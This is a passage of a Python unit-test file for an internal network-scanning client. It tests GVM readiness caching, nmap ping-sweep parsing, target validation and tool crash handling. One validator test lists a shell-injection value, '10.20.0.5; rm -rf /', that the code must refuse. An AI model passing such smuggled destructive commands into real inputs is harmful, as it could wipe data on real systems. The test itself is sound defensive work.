    def test_false_when_the_socket_does_not_exist_yet(self):
        with mock.patch('client.openvas.socket_path', return_value='/no/such/socket'):
            self.assertFalse(tools.gvm_available())

    def test_true_once_the_package_imports_and_the_socket_exists(self):
        with tempfile.NamedTemporaryFile() as sock_file:
            with mock.patch('client.openvas.socket_path', return_value=sock_file.name):
                self.assertTrue(tools.gvm_available())


DISCOVER_XML = """<?xml version="1.0"?><nmaprun><host><status state="up"/><address addr="10.20.0.5" addrtype="ipv4"/>
<hostnames><hostname name="files.corp" type="PTR"/></hostnames></host>
<host><status state="down"/><address addr="10.20.0.6" addrtype="ipv4"/></host>
<host><status state="up"/><address addr="10.20.0.9" addrtype="ipv4"/><hostnames/></host>
<host><status state="up"/><address addr="aa:bb:cc:dd:ee:ff" addrtype="mac"/></host></nmaprun>"""


class DiscoverTests(unittest.TestCase):
    def setUp(self):
        patcher = mock.patch('client.config._local_internal', return_value=True)
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_only_up_hosts_with_an_ipv4_address_are_reported(self):
        self.assertEqual(tools.parse_discover_xml(DISCOVER_XML)['hosts'],
                         [{'ip': '10.20.0.5', 'hostnames': ['files.corp']}, {'ip': '10.20.0.9', 'hostnames': []}])
        self.assertEqual(tools.parse_discover_xml('not xml'), {'hosts': []})
        self.assertEqual(tools.parse_discover_xml(''), {'hosts': []})

    def test_the_run_is_a_fixed_ping_sweep_of_the_validated_chunk(self):
        with mock.patch('client.tools._run', return_value=DISCOVER_XML) as fake_run:
            out = tools.run_discover('10.20.0.0/24')
        argv = fake_run.call_args[0][0]
        self.assertEqual(argv[0], tools.NMAP_BIN)
        self.assertIn('-sn', argv)
        self.assertNotIn('-sV', argv)
        self.assertEqual(argv[-1], '10.20.0.0/24')
        self.assertEqual(len(out['hosts']), 2)

    def test_a_public_ipv6_oversized_or_malformed_target_is_refused_without_running_anything(self):
        for bad in ('8.8.8.0/24', '10.0.0.0/8', 'fd00::/112', '10.20.0.5; rm -rf /', '10.20.0.7/24', '', None, '10.20.0.0/24 10.21.0.0/24'):
            with self.subTest(bad=bad), mock.patch('client.tools._run') as fake_run:
                with self.assertRaises(tools.TargetError):
                    tools.run_discover(bad)
                fake_run.assert_not_called()
        self.assertEqual(tools.validate_cidr(' 192.168.4.0/24 '), '192.168.4.0/24')
        self.assertEqual(tools.validate_cidr('100.64.1.0/25'), '100.64.1.0/25')

    def test_an_external_sentinel_never_sweeps_whatever_the_server_set(self):
        with mock.patch('client.config._local_internal', return_value=False), mock.patch('client.config._overrides', {'network': 'internal'}), \
                mock.patch('client.tools._run') as fake_run:
            with self.assertRaisesRegex(tools.TargetError, 'internal Sentinel'):
                tools.run_discover('10.20.0.0/24')
        fake_run.assert_not_called()


class GvmStatusTests(unittest.TestCase):
    def setUp(self):
        tools._GVM_STATUS.update(at=None, value=(False, 'not checked yet'))
        self.addCleanup(tools._GVM_STATUS.update, at=None, value=(False, 'not checked yet'))
        patcher = mock.patch('client.tools.gvm_available', return_value=True)
        patcher.start()
        self.addCleanup(patcher.stop)

    def test_not_available_is_not_ready_without_asking_gvmd(self):
        with mock.patch('client.tools.gvm_available', return_value=False), mock.patch('client.openvas.readiness') as readiness:
            ready, why = tools.gvm_status()
        self.assertFalse(ready)
        self.assertIn('not running', why)
        readiness.assert_not_called()

    def test_the_first_check_happens_even_right_after_boot(self):
        with mock.patch('client.openvas.readiness', return_value=(True, '')) as readiness:
            self.assertEqual(tools.gvm_status(now=5), (True, ''))
        readiness.assert_called_once_with()

    def test_readiness_is_asked_once_a_minute_while_not_ready_and_the_reason_is_kept(self):
        with mock.patch('client.openvas.readiness', return_value=(False, 'GVM is still syncing its SCAP feed(s)')) as readiness:
            self.assertEqual(tools.gvm_status(now=100), (False, 'GVM is still syncing its SCAP feed(s)'))
            self.assertEqual(tools.gvm_status(now=130), (False, 'GVM is still syncing its SCAP feed(s)'))
            self.assertEqual(readiness.call_count, 1)
            readiness.return_value = (True, '')
            self.assertEqual(tools.gvm_status(now=100 + tools.GVM_STATUS_TTL + 1), (True, ''))
            self.assertTrue(tools.gvm_ready())

    def test_a_ready_answer_is_kept_longer(self):
        with mock.patch('client.openvas.readiness', return_value=(True, '')) as readiness:
            tools.gvm_status(now=1000)
            tools.gvm_status(now=1000 + tools.GVM_STATUS_TTL + 1)
            self.assertEqual(readiness.call_count, 1)
            tools.gvm_status(now=1000 + tools.GVM_READY_TTL + 1)
            self.assertEqual(readiness.call_count, 2)

    def test_a_failing_readiness_check_is_not_ready_never_an_exception(self):
        with mock.patch('client.openvas.readiness', side_effect=PermissionError(13, 'Permission denied', '/run/gvmd/gvmd.sock')):
            ready, why = tools.gvm_status(now=10)
        self.assertFalse(ready)
        self.assertIn('PermissionError', why)
        self.assertNotIn('/run/gvmd', why)

    def test_one_check_at_a_time_and_the_others_get_the_cached_answer(self):
        release, entered = threading.Event(), threading.Event()

        def slow_readiness():
            entered.set()
            release.wait(5)
            return True, ''
        with mock.patch('client.openvas.readiness', side_effect=slow_readiness) as readiness:
            worker = threading.Thread(target=tools.gvm_status, kwargs={'now': 10})
            worker.start()
            self.assertTrue(entered.wait(5))
            self.assertEqual(tools.gvm_status(now=10), (False, 'not checked yet'))  # did not wait, did not check again
            release.set()
            worker.join(5)
            self.assertEqual(readiness.call_count, 1)
        self.assertEqual(tools.gvm_status(now=11), (True, ''))


class ToolExitTests(unittest.TestCase):
    """A tool that crashed or was killed must never read as an empty result."""

    def script(self, body):
        handle = tempfile.NamedTemporaryFile('w', suffix='.sh', delete=False)
        handle.write('#!/bin/sh\n' + body + '\n')
        handle.close()
        os.chmod(handle.name, 0o755)
        self.addCleanup(os.unlink, handle.name)
        return handle.name

    def test_a_non_zero_exit_is_an_error_even_with_no_output(self):
        with self.assertRaises(tools.ToolExitError) as ctx:
            tools._run(['sh', '-c', 'echo boom >&2; exit 3'], 10)
        self.assertIn('status 3', str(ctx.exception))
        self.assertIn('boom', str(ctx.exception))

    def test_a_non_zero_exit_with_partial_output_is_still_an_error(self):
        with self.assertRaises(tools.ToolExitError):
            tools._run(['sh', '-c', 'echo partial; exit 1'], 10)

    def test_a_killed_tool_is_an_error(self):
        with self.assertRaises(tools.ToolExitError) as ctx:
            tools._run(['sh', '-c', 'kill -9 $$'], 10)
        self.assertIn('-9', str(ctx.exception))

    def test_a_clean_exit_returns_its_output(self):
        self.assertEqual(tools._run(['sh', '-c', 'echo ok'], 10).strip(), 'ok')

    def test_naabu_nmap_and_nuclei_report_a_crash_not_an_empty_answer(self):
        crash = self.script('exit 2')
        with mock.patch.object(tools, 'NAABU_BIN', crash), self.assertRaises(tools.ToolExitError):
            tools.run_naabu(['8.8.8.8'])
        with mock.patch.object(tools, 'NMAP_BIN', crash), self.assertRaises(tools.ToolExitError):
            tools.run_nmap(['8.8.8.8'])
        with mock.patch.object(tools, 'NUCLEI_BIN', crash), self.assertRaises(tools.ToolExitError):
            tools.run_nuclei(['8.8.8.8'])


if __name__ == '__main__':
    unittest.main()
